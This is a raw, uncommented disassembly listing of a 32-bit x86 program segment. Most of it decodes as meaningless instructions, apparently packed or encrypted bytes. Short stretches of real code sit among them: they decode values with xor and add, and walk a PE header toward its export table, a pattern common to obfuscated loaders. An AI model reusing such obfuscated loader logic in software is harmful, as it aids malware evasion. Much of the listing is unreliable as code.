  402832:	and    BYTE PTR [esi],dh
  402834:	lods   eax,DWORD PTR ds:[esi]
  402835:	pop    edi
  402836:	xor    dl,al
  402838:	inc    ebx
  402839:	sub    dh,BYTE PTR [edx+0x3b9dc947]
  40283f:	(bad)  
  402840:	fstp   DWORD PTR [ebx]
  402842:	enter  0xc67e,0xe0
  402846:	jle    0x4028c0
  402848:	push   ss
  402849:	inc    eax
  40284a:	inc    edi
  40284b:	mov    bl,0x50
  40284d:	jns    0x4028c0
  40284f:	mov    esp,0xa8501fe2
  402854:	in     al,dx
  402855:	fstp   QWORD PTR [ecx]
  402857:	xor    bl,BYTE PTR [ecx+eax*8+0x682d3cc2]
  40285e:	xchg   ebp,eax
  40285f:	mov    ecx,0x8b86f9bb
  402864:	xchg   dh,bl
  402866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402867:	ins    DWORD PTR es:[edi],dx
  402868:	dec    edi
  402869:	retf   
  40286a:	push   0xc72cf0e2
  40286f:	and    bh,BYTE PTR [eax+0x7c]
  402872:	mov    edx,0xba494312
  402877:	scas   al,BYTE PTR es:[edi]
  402878:	mul    DWORD PTR ds:0x9a927397
  40287e:	in     eax,dx
  40287f:	jbe    0x4028ab
  402881:	sbb    al,0x79
  402883:	inc    ecx
  402884:	and    DWORD PTR [ebx-0x34669b8e],ebx
  40288a:	push   ebx
  40288b:	mov    WORD PTR [ebp+eax*4+0x1c],ss
  40288f:	jmp    0x11a0:0xa4741a7a
  402896:	pop    esi
  402897:	inc    esi
  402898:	mov    WORD PTR [ebx+0x1f],cs
  40289b:	push   ss
  40289c:	(bad)  
  40289e:	push   ecx
  40289f:	std    
  4028a0:	sub    eax,0xe840f41
  4028a5:	add    BYTE PTR [eax],al
  4028a7:	add    BYTE PTR [ebx+0xc7f845],cl
  4028ad:	lea    ebx,[esi]
  4028af:	xor    al,0x60
  4028b1:	jmp    0x402f69
  4028b6:	mov    eax,DWORD PTR [ebp+0x8]
  4028b9:	mov    ecx,DWORD PTR [ebp-0x8]
  4028bc:	xor    eax,esi
  4028be:	add    eax,edi
  4028c0:	cmp    DWORD PTR [ecx],eax
  4028c2:	je     0x402c4b
  4028c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4028cb:	mov    eax,DWORD PTR [ebp-0x8]
  4028ce:	mov    eax,DWORD PTR [eax]
  4028d0:	jmp    0x402bd6
  4028d5:	in     eax,dx
  4028d6:	outs   dx,BYTE PTR ds:[esi]
  4028d7:	out    0xf4,eax
  4028d9:	jae    0x40294c
  4028db:	std    
  4028dc:	jne    0x402955
  4028de:	lds    esi,FWORD PTR [edi]
  4028e0:	int3   
  4028e1:	scas   eax,DWORD PTR es:[edi]
  4028e2:	sbb    al,0x3c
  4028e4:	out    dx,al
  4028e5:	fisttp QWORD PTR [eax]
  4028e7:	jl     0x402965
  4028e9:	addr16 jle 0x402968
  4028ec:	jl     0x4028ca
  4028ee:	pop    es
  4028ef:	xor    eax,DWORD PTR [ebx-0x7b5e3e5a]
  4028f5:	ins    DWORD PTR es:[edi],dx
  4028f6:	call   0xb4b1:0x79c3fa7e
  4028fd:	or     BYTE PTR ds:0x87b9d19c,al
  402903:	cmc    
  402904:	daa    
  402905:	rol    dh,1
  402907:	les    edx,FWORD PTR [ecx+0x43]
  40290a:	adc    al,0xc1
  40290c:	mov    edi,0x9398923f
  402911:	mov    ebx,0x85644dd3
  402916:	test   DWORD PTR [eax+0x19],esp
  402919:	pop    ecx
  40291a:	(bad)  
  40291b:	stos   BYTE PTR es:[edi],al
  40291c:	nop
  40291d:	mov    edx,0x2136d2bb
  402922:	inc    ecx
  402923:	cdq    
  402924:	mov    es,eax
  402926:	xchg   ebx,eax
  402927:	mov    ds:0x4fe4d5bd,al
  40292c:	mov    al,0xa9
  40292e:	dec    ebx
  40292f:	fdiv   QWORD PTR [edi]
  402931:	je     0x4028d9
  402933:	cmc    
  402934:	and    edx,esp
  402936:	jno    0x4028d5
  402938:	fbld   TBYTE PTR [edi+0x11]
  40293b:	and    eax,0xe8849155
  402940:	add    eax,0x787ff626
  402945:	jmp    0x844:0xa7674b5
  40294c:	push   eax
  40294d:	cmp    eax,0x920ad1f3
  402952:	xor    DWORD PTR ds:0x94032faf,ecx
  402958:	js     0x402970
  40295a:	ss xchg esi,eax
  40295c:	mov    bl,0x16
  40295e:	sbb    BYTE PTR [eax+0x70],bh
  402961:	ins    BYTE PTR es:[edi],dx
  402962:	mov    ebp,0x1b2830ba
  402967:	xor    eax,0xf290802
  40296c:	mov    eax,ds:0x39e15d01
  402971:	cmp    BYTE PTR [edi+0x31],cl
  402974:	jne    0x4029e1
  402976:	fiadd  DWORD PTR [esi+0x1b]
  402979:	dec    ebx
  40297a:	shr    DWORD PTR [ebp+esi*2-0x78],cl
  40297e:	ins    DWORD PTR es:[edi],dx
  40297f:	push   esi
  402980:	fiadd  DWORD PTR [eax]
  402982:	out    dx,eax
  402983:	bound  ecx,QWORD PTR [eax-0x7d]
  402986:	adc    ebx,esp
  402988:	xor    ebp,eax
  40298a:	sbb    al,0x26
  40298c:	sbb    DWORD PTR [ebx],esp
  40298e:	mov    esi,0xd208e8b6
  402993:	or     bh,ah
  402995:	mov    BYTE PTR [edi+0x5d363b8b],ah
  40299b:	inc    edi
  40299c:	ror    BYTE PTR [esi],cl
  40299e:	iret   
  40299f:	test   al,0xfe
  4029a1:	jecxz  0x40297f
  4029a3:	iret   
  4029a4:	push   esi
  4029a5:	dec    ebx
  4029a6:	mov    ecx,0x5613f585
  4029ab:	sub    DWORD PTR ds:0x1caf819e,0xffffff84
  4029b2:	dec    esp
  4029b3:	inc    ebp
  4029b4:	test   eax,0x4d8c399c
  4029b9:	jmp    0xf3ff:0x46d93b22
  4029c0:	push   es
  4029c1:	inc    ecx
  4029c2:	sbb    DWORD PTR [edi-0x46],eax
  4029c5:	jnp    0x4029ac
  4029c7:	push   0xb
  4029c9:	fst    QWORD PTR ds:0x61107ad4
  4029cf:	dec    ecx
  4029d0:	(bad)  
  4029d1:	dec    ebp
  4029d2:	add    al,0x1c
  4029d4:	jo     0x31f0aabe
  4029da:	add    ebx,DWORD PTR [eax]
  4029dc:	cld    
  4029dd:	xor    DWORD PTR [ebx],ebx
  4029df:	mov    gs,esi
  4029e1:	dec    eax
  4029e2:	enter  0x1914,0x95
  4029e6:	dec    edi
  4029e7:	sar    ebx,1
  4029e9:	jmp    0x402983
  4029eb:	and    cl,BYTE PTR [esi-0x3bcfb2d8]
  4029f1:	sbb    eax,0xbba6f29c
  4029f6:	test   al,0xd5
  4029f8:	test   BYTE PTR [ebx],ch
  4029fa:	outs   dx,DWORD PTR ds:[esi]
  4029fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029fc:	cwde   
  4029fd:	jg     0x4029fb
  4029ff:	adc    ah,BYTE PTR [edx-0x2]
  402a02:	leave  
  402a03:	inc    ecx
  402a04:	adc    BYTE PTR [esi+0x2],ch
  402a07:	dec    ebp
  402a08:	cs jns 0x402a47
  402a0b:	xor    eax,0xd8f2eac1
  402a10:	aam    0x36
  402a12:	and    cl,ah
  402a14:	popa   
  402a15:	add    DWORD PTR [ebx+0x40],edi
  402a18:	mov    WORD PTR [esp+esi*2],es
  402a1b:	mov    bh,0xb6
  402a1d:	xchg   ecx,eax
  402a1e:	lods   eax,DWORD PTR ds:[esi]
  402a1f:	and    cl,bh
  402a21:	sbb    edx,ecx
  402a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a24:	dec    ecx
  402a25:	mov    ecx,0x481199cd
  402a2a:	push   cs
  402a2b:	das    
  402a2c:	sbb    bh,BYTE PTR [edx]
  402a2e:	fdivr  QWORD PTR [ecx]
  402a30:	push   edx
  402a31:	in     al,dx
  402a32:	push   esp
  402a33:	fld    DWORD PTR [edi-0x7481a8c8]
  402a39:	push   cs
  402a3a:	mov    al,0xeb
  402a3c:	dec    esp
  402a3d:	cwde   
  402a3e:	mov    eax,0xd0da1380
  402a43:	mov    eax,ds:0x6a69401d
  402a48:	xchg   BYTE PTR [edx-0x4e],al
  402a4b:	arpl   WORD PTR [ebx-0x647fad86],si
  402a51:	cli    
  402a52:	mov    eax,0xde8ef1ce
  402a57:	xchg   ecx,eax
  402a58:	sbb    BYTE PTR [esi+ebx*2-0x29],bh
  402a5c:	les    ebp,FWORD PTR [ecx-0x12f44011]
  402a62:	sbb    ch,al
  402a64:	and    ecx,DWORD PTR [ecx-0x1b]
  402a67:	imul   ax,WORD PTR [edx+ebx*2+0x656e3598],0xa933
  402a71:	daa    
  402a72:	xchg   edi,eax
  402a73:	lods   eax,DWORD PTR ds:[esi]
  402a74:	fadd   QWORD PTR ds:0x788585ba
  402a7a:	push   0x2f
  402a7c:	jl     0x402aa9
  402a7e:	aad    0xa6
  402a80:	adc    al,BYTE PTR ds:0x8d6e9eb4
  402a86:	add    BYTE PTR [ebx+0x30],ch
  402a89:	mov    al,0xe3
  402a8b:	sub    DWORD PTR [esp+esi*1-0x32352d],esi
  402a92:	mov    ebp,0x42b15ec5
  402a97:	push   ebp
  402a98:	xor    DWORD PTR [eax-0x58],eax
  402a9b:	push   0x7ca5a0b2
  402aa0:	pop    edi
  402aa1:	clc    
  402aa2:	into   
  402aa3:	cmp    bh,0xb6
  402aa6:	dec    esp
  402aa7:	shr    DWORD PTR [edx-0x6115cac4],1
  402aad:	mov    ebp,0x84824d2c
  402ab2:	push   ebp
  402ab3:	mov    ebx,0x700207d0
  402ab8:	jmp    0x13b:0xdd36091d
  402abf:	retf   0xcc22
  402ac2:	sub    esp,DWORD PTR gs:[ecx+esi*2-0x289dd8bb]
  402aca:	sub    al,0xdf
  402acc:	ror    eax,1
  402ace:	int    0x4e
  402ad0:	out    0x8a,eax
  402ad2:	fst    DWORD PTR [esi+esi*4]
  402ad5:	(bad)  
  402ad6:	aas    
  402ad7:	inc    esp
  402ad8:	std    
  402ad9:	push   ecx
  402ada:	add    esp,ecx
  402adc:	xchg   ch,ch
  402ade:	div    BYTE PTR [esi]
  402ae0:	push   ds
  402ae1:	jae    0x402ab9
  402ae3:	xchg   esp,eax
  402ae4:	imul   edi,ebx,0xffffffe5
  402ae7:	out    0xa6,eax
  402ae9:	sub    eax,ebx
  402aeb:	repnz push ss
  402aed:	fisub  WORD PTR [ecx+0x3bee0262]
  402af3:	mov    bh,0xb4
  402af5:	adc    edx,DWORD PTR [esi+0x791ce742]
  402afb:	cdq    
  402afc:	inc    ebx
  402afd:	push   0xde6b0434
  402b02:	mov    ecx,0xb28702eb
  402b07:	pusha  
  402b08:	(bad)  
  402b09:	mov    WORD PTR [esi+eiz*2],gs
  402b0c:	dec    eax
  402b0d:	xchg   edx,eax
  402b0e:	dec    edi
  402b0f:	popa   
  402b10:	adc    al,0xb0
  402b12:	bound  ecx,QWORD PTR [edx]
  402b14:	dec    edi
  402b15:	mov    ds:0x7cb5a5b,al
  402b1a:	inc    esp
  402b1b:	ret    0x9f43
  402b1e:	mov    bl,0x15
  402b20:	cmp    ah,cl
  402b22:	stos   BYTE PTR es:[edi],al
  402b23:	xchg   ebp,eax
  402b24:	fistp  QWORD PTR [edx-0x3c]
  402b27:	das    
  402b28:	leave  
  402b29:	cwde   
  402b2a:	mov    edx,0x83f40545
  402b2f:	test   BYTE PTR ds:0x242aa173,bh
  402b35:	cs test eax,0xf5f07690
  402b3b:	and    eax,0x60167311
  402b40:	data16 jmp 0x402b2a
  402b43:	pop    es
  402b44:	add    al,0x1f
  402b46:	ss pop ss
  402b48:	mov    bl,0xe0
  402b4a:	dec    esp
  402b4b:	jae    0x402b0c
  402b4d:	shl    DWORD PTR [edi+ebx*8+0x9],cl
  402b51:	jle    0x402af1
  402b53:	sbb    cl,bl
  402b55:	pop    ebp
  402b56:	ss xchg ebx,eax
  402b58:	add    DWORD PTR [edi-0x49c23501],ebp
  402b5e:	not    DWORD PTR [esi-0x56]
  402b61:	repz lock imul ebx,DWORD PTR [edx+0x2],0x14
  402b67:	shr    BYTE PTR [esi-0x21e8cb4e],cl
  402b6d:	ret    
  402b6e:	fdiv   QWORD PTR [ecx+0x5e]
  402b71:	mov    bl,0x52
  402b73:	daa    
  402b74:	jne    0x402b89
  402b76:	xor    esi,DWORD PTR [edi+0x7e7848f3]
  402b7c:	shr    BYTE PTR [edx],0xca
  402b7f:	outs   dx,DWORD PTR ds:[esi]
  402b80:	lea    esp,[eax+0x2f2451fa]
  402b86:	stc    
  402b87:	push   ss
  402b88:	mov    al,0x9
  402b8a:	sbb    ebx,eax
  402b8c:	mov    es,WORD PTR [ecx-0x22064966]
  402b92:	int    0x50
  402b94:	add    BYTE PTR [edx+esi*1-0x3c],bl
  402b98:	ins    DWORD PTR es:[edi],dx
  402b99:	stos   BYTE PTR es:[edi],al
  402b9a:	out    dx,eax
  402b9b:	mov    edi,0x67c9ca1c
  402ba0:	ret    
  402ba1:	add    al,BYTE PTR [ebp-0xa]
  402ba4:	sbb    al,BYTE PTR [ebp+0x1a]
  402ba7:	add    DWORD PTR [edx-0x42],ebp
  402baa:	scas   al,BYTE PTR es:[edi]
  402bab:	dec    esp
  402bac:	adc    eax,0x218e2426
  402bb1:	aam    0xa
  402bb3:	push   ecx
  402bb4:	fs clc 
  402bb6:	jbe    0x402b7a
  402bb8:	(bad)  
  402bb9:	arpl   si,sp
  402bbb:	arpl   bx,sp
  402bbd:	mov    esi,0x5e2bfa6c
  402bc2:	imul   esp,DWORD PTR [ecx-0x169ff48f],0x7a142454
  402bcc:	into   
  402bcd:	ret    0xc9e4
  402bd0:	push   edx
  402bd1:	mov    ebx,0x4a3e1f7a
  402bd6:	mov    eax,DWORD PTR [eax+0x3c]
  402bd9:	lea    ecx,[ecx*8+0x78]
  402be0:	add    eax,ecx
  402be2:	mov    ecx,DWORD PTR [ebp-0x8]
  402be5:	mov    ecx,DWORD PTR [ecx]
  402be7:	mov    eax,DWORD PTR [eax+ecx*1]
  402bea:	mov    DWORD PTR [ebp-0x1c],eax
  402bed:	mov    eax,DWORD PTR [ebp+0x8]
  402bf0:	xor    eax,esi
  402bf2:	add    eax,edi
  402bf4:	mov    DWORD PTR [ebp-0x20],eax
  402bf7:	mov    eax,DWORD PTR [ebp+0x8]
  402bfa:	mov    ecx,DWORD PTR [ebp-0x1c]
  402bfd:	xor    eax,esi
  402bff:	add    eax,edi
  402c01:	cmp    ecx,eax
  402c03:	je     0x402f69
  402c09:	mov    eax,DWORD PTR [ebp-0x8]
  402c0c:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c0f:	add    ecx,DWORD PTR [eax]
  402c11:	mov    DWORD PTR [ebp-0x20],ecx
  402c14:	mov    eax,DWORD PTR [ebp-0x20]
  402c17:	mov    ecx,DWORD PTR [ebp-0x8]
  402c1a:	mov    eax,DWORD PTR [eax+0xc]
  402c1d:	mov    ecx,DWORD PTR [ecx]
  402c1f:	mov    al,BYTE PTR [eax+ecx*1]
  402c22:	add    al,0x39
  402c24:	xor    al,0x45
  402c26:	cmp    al,0xc1
  402c28:	je     0x402c3f
  402c2e:	mov    eax,DWORD PTR [ebp+0x8]
  402c31:	mov    ecx,DWORD PTR [ebp-0x8]
  402c34:	xor    eax,esi
  402c36:	add    eax,edi
  402c38:	mov    DWORD PTR [ecx],eax
  402c3a:	jmp    0x402f69
  402c3f:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  402c46:	jmp    0x402f69
  402c4b:	mov    eax,DWORD PTR [ebp-0x8]
  402c4e:	mov    ecx,DWORD PTR [ebp-0x18]
  402c51:	mov    ecx,DWORD PTR [ecx]
  402c53:	mov    DWORD PTR [eax],ecx
  402c55:	mov    eax,DWORD PTR [ebp+0xc]
  402c58:	mov    eax,DWORD PTR [ebp+0x8]
  402c5b:	jmp    0x402f61
  402c60:	add    al,0x8f
  402c62:	and    ecx,0xffffff93
  402c65:	std    
  402c66:	bound  ebp,QWORD PTR [ecx-0x45]
  402c69:	or     DWORD PTR [edi+0x5d],eax
  402c6c:	cdq    
  402c6d:	add    eax,0x15c4fd0b
  402c72:	jl     0x402cf0
  402c74:	addr16 jle 0x402cf3
  402c77:	jl     0x402cc2
  402c79:	xchg   esi,eax
  402c7a:	mov    BYTE PTR [esi-0x6e2c2538],cl
  402c80:	in     al,0x8f
  402c82:	lahf   
  402c83:	xor    al,0x84
  402c85:	lock aad 0xe6
  402c88:	popf   
  402c89:	nop
  402c8a:	popw   ss
  402c8c:	test   ebp,eax
  402c8e:	push   0xffffffd3
  402c90:	mov    dh,0x13
  402c92:	inc    eax
  402c93:	iret   
  402c94:	dec    ecx
  402c95:	push   0x7b323ec6
  402c9a:	ss xor eax,0x8cacceb8
  402ca0:	and    al,0xa2
  402ca2:	pop    esi
  402ca3:	mov    ebp,0xd41feb13
  402ca8:	pop    ebx
  402ca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402caa:	cli    
  402cab:	mov    dh,0xd8
  402cad:	or     DWORD PTR [eax-0x75f1f320],edx
  402cb3:	jo     0x402d20
  402cb5:	pop    ss
  402cb6:	std    
  402cb7:	jo     0x402c3d
  402cb9:	push   ds
  402cba:	mov    dh,0x16
  402cbc:	(bad)  
  402cbd:	xchg   esi,eax
  402cbe:	clc    
  402cbf:	popw   ss
  402cc1:	arpl   WORD PTR [ebx],si
  402cc3:	scas   eax,DWORD PTR es:[edi]
  402cc4:	ret    
  402cc5:	loope  0x402cd3
  402cc7:	fbstp  TBYTE PTR [esi]
  402cc9:	mov    edx,0x3e1ce1f7
  402cce:	jl     0x402c67
  402cd0:	aam    0x66
  402cd2:	jno    0x402c7e
  402cd4:	xor    edi,edi
  402cd6:	popa   
  402cd7:	push   esi
  402cd8:	pop    ss
  402cd9:	test   eax,0xd2d0f052
  402cde:	ficom  DWORD PTR [ecx]
  402ce0:	cmp    BYTE PTR [ecx+0x3a],ch
  402ce3:	lods   eax,DWORD PTR ds:[esi]
  402ce4:	mov    esp,0xe15236d
  402ce9:	cmp    eax,0x4d91e28c
  402cee:	clc    
  402cef:	ss int3 
  402cf1:	pop    esp
  402cf2:	pop    esi
  402cf3:	and    eax,0xb6a640be
  402cf8:	(bad)  
  402cf9:	mov    dl,0xbe
  402cfb:	aam    0x5
  402cfd:	icebp  
  402cfe:	ins    BYTE PTR es:[edi],dx
  402cff:	add    BYTE PTR [eax+0x58284023],al
  402d05:	add    eax,0x570e45d7
  402d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d0b:	jl     0x402cf8
  402d0d:	jb     0x402d5c
  402d0f:	out    0x46,al
  402d11:	test   DWORD PTR [esi-0x60],ebp
  402d14:	(bad)  
  402d15:	ror    BYTE PTR [esi+0x30],cl
  402d18:	xor    bh,dh
  402d1a:	or     DWORD PTR [ebp+0x47],esp
  402d1d:	add    DWORD PTR [ebp-0x59],ebx
  402d20:	or     DWORD PTR [ebx],edx
  402d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d23:	push   edi
  402d24:	out    0x64,al
  402d26:	sub    esi,ebp
  402d28:	pop    esp
  402d29:	jno    0x402cf0
  402d2b:	jmp    0x402d20
  402d2d:	fwait
  402d2e:	and    DWORD PTR [edi-0x22],ecx
  402d31:	clc    
  402d32:	int    0x16
  402d34:	cmp    edx,DWORD PTR [ebx+esi*8]
  402d37:	inc    esi
  402d38:	pop    ecx
  402d39:	cwde   
  402d3a:	mov    DWORD PTR [edi-0xb],esi
  402d3d:	mov    cl,0xc0
  402d3f:	cmc    
  402d40:	pop    eax
  402d41:	fidiv  WORD PTR [eax]
  402d43:	cmc    
  402d44:	mov    ebx,0x868bdc14
  402d49:	call   FWORD PTR [ecx]
  402d4b:	inc    edx
  402d4c:	sar    BYTE PTR [edx+edi*4+0x63],cl
  402d50:	push   ss
  402d51:	cdq    
  402d52:	fst    QWORD PTR [ebp-0x784e0da6]
  402d58:	addr16 sti 
  402d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d5b:	rol    DWORD PTR [ebx-0x16],1
  402d5e:	xor    esp,ecx
  402d60:	xchg   esp,eax
  402d61:	push   ebp
  402d62:	inc    ebx
  402d63:	popf   
  402d64:	pop    ecx
  402d65:	mov    edx,0xb8866db
  402d6a:	sbb    al,0x4e
  402d6c:	call   0x5978:0xd173b806
  402d73:	aas    
  402d74:	mul    DWORD PTR [edx-0x2fad6b95]
  402d7a:	dec    ebp
  402d7b:	mov    al,ds:0x1ccb1f68
  402d80:	xchg   ecx,eax
  402d81:	aas    
  402d82:	cmc    
  402d83:	pop    eax
  402d84:	sub    BYTE PTR [edi+ebx*1],bh
  402d87:	xchg   ecx,eax
  402d88:	ins    DWORD PTR es:[edi],dx
  402d89:	push   esi
  402d8a:	jno    0x402de5
  402d8c:	call   0x9018:0xa7ea0e83
  402d93:	int3   
  402d94:	ret    0xa19c
  402d97:	or     al,dl
  402d99:	(bad)  
  402d9a:	rol    BYTE PTR [ecx+eiz*8-0x42668e1a],1
  402da1:	dec    edi
  402da2:	inc    ecx
  402da3:	jne    0x402ddd
  402da5:	lahf   
  402da6:	xchg   edx,eax
  402da7:	xchg   ecx,eax
  402da8:	cwde   
  402da9:	add    esp,DWORD PTR [ebx+ebx*8]
  402dac:	and    eax,0x238c2ba4
  402db1:	cli    
  402db2:	loopne 0x402d99
  402db4:	xor    BYTE PTR [ebp-0x69579a06],cl
  402dba:	xor    ecx,DWORD PTR [edi]
  402dbc:	jl     0x402d4d
  402dbe:	xchg   esi,eax
  402dbf:	inc    esp
  402dc0:	test   al,0x6a
  402dc2:	shr    ecx,0xa1
  402dc5:	xchg   ecx,edx
  402dc7:	scas   al,BYTE PTR es:[edi]
  402dc8:	fcom   st(1)
  402dca:	mov    eax,0xd5836483
  402dcf:	test   eax,0xfed2d87b
  402dd4:	scas   eax,DWORD PTR es:[edi]
  402dd5:	push   0x568cafa3
  402dda:	mov    ecx,0xbac735d9
  402ddf:	cmp    al,0x32
  402de1:	mov    edi,ss
  402de3:	je     0x402d95
  402de5:	and    al,0x4e
  402de7:	inc    edi
  402de8:	lds    ebx,FWORD PTR [ecx-0x7a]
  402deb:	jbe    0x402dfb
  402ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dee:	out    0xaf,al
  402df0:	push   esi
  402df1:	xlat   BYTE PTR ds:[ebx]
  402df2:	imul   DWORD PTR [ecx]
  402df4:	sahf   
  402df5:	add    al,0xd6
  402df7:	push   ss
  402df8:	enter  0x649b,0x14
  402dfc:	sub    DWORD PTR [esi+edi*8+0x5e],0x7a1bd213
  402e04:	cmc    
  402e05:	les    ebp,FWORD PTR [esi-0x32b1f44c]
  402e0b:	in     eax,dx
  402e0c:	mov    ebp,0xc615c630
  402e11:	xlat   BYTE PTR ds:[ebx]
  402e12:	jmp    0xd1cc:0x6b9602b9
  402e19:	in     al,0xb5
  402e1b:	out    dx,eax
  402e1c:	out    0x5,eax
  402e1e:	arpl   WORD PTR [edi],si
  402e20:	sar    BYTE PTR [ebp-0x59d04509],cl
  402e26:	aaa    
  402e27:	lds    edi,FWORD PTR [ebx-0x76]
  402e2a:	push   es
  402e2b:	cmp    eax,0x934c9058
  402e30:	and    DWORD PTR [edi+0x1e],0x9e69296b
  402e37:	call   0x47820e97
  402e3c:	ret    0xa69f
  402e3f:	or     ch,BYTE PTR [esi+0x20]
  402e42:	cmp    dl,bh
  402e44:	cwde   
  402e45:	ds cdq 
  402e47:	or     esi,DWORD PTR [edi]
  402e49:	(bad)  
  402e4a:	loopne 0x402e7b
  402e4c:	int    0x54
  402e4e:	iret   
  402e4f:	rcl    BYTE PTR [eax],cl
  402e51:	add    esp,eax
  402e53:	adc    cl,BYTE PTR [esi+0x42693ffc]
  402e59:	in     eax,dx
  402e5a:	bound  eax,QWORD PTR [esi+0x64]
  402e5d:	or     al,0x16
  402e5f:	pusha  
  402e60:	in     al,0x8e
  402e62:	test   eax,0x68570ce9
  402e67:	dec    edi
  402e68:	(bad)  
  402e69:	sub    eax,0x307ce83f
  402e6e:	xchg   esi,esi
  402e70:	ds push eax
  402e72:	jae    0x402e17
  402e74:	pop    edx
  402e75:	mov    edi,0x44b7c6b9
  402e7a:	shl    DWORD PTR [ecx-0xc],0x77
  402e7e:	stos   DWORD PTR es:[edi],eax
  402e7f:	jg     0x402ebf
  402e81:	fcom   DWORD PTR [ecx-0x59a8d4b1]
  402e87:	xor    dl,bl
  402e89:	xchg   ebp,esp
  402e8b:	pushf  
  402e8c:	push   es
  402e8d:	ins    BYTE PTR es:[edi],dx
  402e8e:	xor    DWORD PTR [esi-0x7a0c7a43],ecx
  402e94:	pop    ebp
  402e95:	xchg   edx,eax
  402e96:	mov    cl,0xd4
  402e98:	imul   esp,ebp,0xffffffc0
  402e9b:	cmp    dh,cl
  402e9d:	xchg   ebp,eax
  402e9e:	mov    al,ss:0x9109f24
  402ea4:	shr    BYTE PTR [esp+ecx*2+0x64],0xc2
  402ea9:	sub    ebx,DWORD PTR [edi+ebx*4+0x26]
  402ead:	repz xchg edi,eax
  402eaf:	add    ah,BYTE PTR [edx]
  402eb1:	stc    
  402eb2:	mov    edx,0x38e3f017
  402eb7:	dec    edi
  402eb8:	(bad)  
  402eb9:	imul   BYTE PTR [ebx+0x220056cd]
  402ebf:	ins    DWORD PTR es:[edi],dx
  402ec0:	pop    ds
  402ec1:	in     eax,dx
  402ec2:	call   0xea812294
  402ec7:	sub    DWORD PTR [ebx+ebx*2],edx
  402eca:	adc    al,0xf6
  402ecc:	add    dl,BYTE PTR [esi+ebx*2]
  402ecf:	cld    
  402ed0:	xlat   BYTE PTR ds:[ebx]
  402ed1:	int    0xf0
  402ed3:	pop    edx
  402ed4:	(bad)  
  402ed6:	cld    
  402ed7:	jne    0x402ef4
  402ed9:	pop    ebx
  402eda:	(bad)  
  402edb:	dec    ecx
  402edc:	mov    ecx,0xf2f0085a
  402ee1:	jae    0x402ee4
  402ee3:	dec    esi
  402ee4:	lahf   
  402ee5:	add    BYTE PTR [ebp+0xe],bh
  402ee8:	fisttp WORD PTR [ebx+0x55]
  402eeb:	push   0xf094f886
  402ef0:	fsubr  st,st(1)
  402ef2:	mov    WORD PTR [eax-0x6e1d012f],gs
  402ef8:	push   es
  402ef9:	clc    
  402efa:	adc    DWORD PTR [ecx],esp
  402efc:	push   ss
  402efd:	cmp    ebp,esi
  402eff:	dec    edx
  402f00:	inc    ebx
  402f01:	dec    ecx
  402f02:	pop    ecx
  402f03:	or     ecx,DWORD PTR [ebx+0x71]
  402f06:	in     eax,0x7d
  402f08:	cmp    al,0x67
  402f0a:	ror    esi,cl
  402f0c:	add    bh,cl
  402f0e:	push   ebx
  402f0f:	xor    eax,0x22d8792
  402f14:	jmp    0x15e95f28
  402f19:	popf   
  402f1a:	jo     0x402e9d
  402f1c:	dec    edx
  402f1d:	or     BYTE PTR [edx],ch
  402f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f20:	in     al,0x1c
  402f22:	or     eax,0x87dcd9b7
  402f27:	adc    ebp,DWORD PTR [ecx+0x37]
  402f2a:	out    dx,al
  402f2b:	rcr    DWORD PTR [ecx+0x8],cl
  402f2e:	imul   ebp,DWORD PTR [eax+0x4d],0x4a
  402f32:	mov    ds:0x8bd1d5f8,al
  402f37:	leave  
  402f38:	jg     0x402fb7
  402f3a:	or     BYTE PTR [esi],bh
  402f3c:	sub    dl,BYTE PTR [ecx+esi*1-0x2e86739d]
  402f43:	sti    
  402f44:	sub    al,0x64
  402f47:	pop    esi
  402f48:	rcl    DWORD PTR [esp+eax*1],cl
  402f4b:	mov    ds:0xbe1afe17,eax
  402f50:	sub    eax,edi
  402f52:	push   ecx
  402f53:	dec    ebp
  402f54:	jge    0x402eeb
  402f56:	mov    bh,0xf3
  402f58:	cmp    bh,BYTE PTR [ebx+esi*2-0x4c]
  402f5c:	sbb    esi,DWORD PTR [edx+0x6f]
  402f5f:	add    eax,0xf875ff07
  402f64:	call   0x4062cd
  402f69:	mov    eax,DWORD PTR [ebp-0xc]
  402f6c:	cmp    eax,ebx
  402f6e:	je     0x401817
  402f74:	mov    eax,DWORD PTR [ebp-0x8]
  402f77:	mov    eax,DWORD PTR [eax]
  402f79:	pop    edi
  402f7a:	pop    esi
  402f7b:	jmp    0x403281
  402f80:	imul   ebx,DWORD PTR [eax],0x54
  402f83:	cmc    
  402f84:	push   edi
  402f85:	jge    0x403004
  402f87:	call   0x2f22:0x1360eb95
  402f8e:	jg     0x402f28
  402f90:	das    
  402f91:	push   ss
  402f92:	jl     0x403010
  402f94:	addr16 jle 0x403013
  402f97:	jl     0x402f95
  402f99:	cli    
  402f9a:	lock or eax,0x7598e584
  402fa0:	(bad)  
  402fa1:	and    ecx,DWORD PTR [esi-0x35]
  402fa4:	xor    DWORD PTR [esi-0x76],0xffffffa5
  402fa8:	dec    edi
  402fa9:	lahf   
  402faa:	ja     0x402f75
  402fac:	dec    edi
  402fad:	fimul  DWORD PTR [edx-0x79fa8cc6]
  402fb3:	rcl    BYTE PTR [ebx-0x188ae378],cl
  402fb9:	add    eax,0x1724bbb6
  402fbe:	push   edi
  402fbf:	and    al,0xc
  402fc1:	mov    esp,0xc21e5a3
  402fc6:	call   0x7f47b02c
  402fcb:	inc    edx
  402fcc:	pop    esi
  402fcd:	outs   dx,BYTE PTR ds:[esi]
  402fce:	ins    DWORD PTR es:[edi],dx
  402fcf:	lea    ebx,[ebp-0x18d7df4c]
  402fd5:	ins    BYTE PTR es:[edi],dx
  402fd6:	ret    0x4757
  402fd9:	fiadd  DWORD PTR [ecx+0x43]
  402fdc:	icebp  
  402fdd:	gs int3 
  402fdf:	arpl   WORD PTR [eax+0x77],di
  402fe2:	or     eax,0x52224fe0
